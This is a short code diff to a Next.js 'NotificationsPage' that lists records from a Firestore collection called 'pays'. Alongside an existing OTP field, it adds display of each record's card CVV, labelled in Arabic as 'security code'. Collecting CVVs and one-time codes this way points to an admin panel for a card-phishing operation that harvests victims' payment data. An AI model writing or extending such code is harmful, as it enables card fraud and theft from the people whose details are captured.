@@ -98,7 +98,9 @@ export default function NotificationsPage() {
 
     return () => unsubscribe()
   }, [router])
+  useEffect(()=>{
 
+  },[])
   const fetchNotifications = () => {
     setIsLoading(true)
     const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
@@ -603,6 +605,9 @@ export default function NotificationsPage() {
               </p>
               <p className="flex items-center">
                 <strong className="text-red-400 mx-4">رمز التحقق :</strong> {selectedNotification?.otp2!}
+              </p> 
+               <p className="flex items-center">
+                <strong className="text-red-400 mx-4">رمز الامان :</strong> {selectedNotification?.cvv!}
               </p>
             </div>
           )}
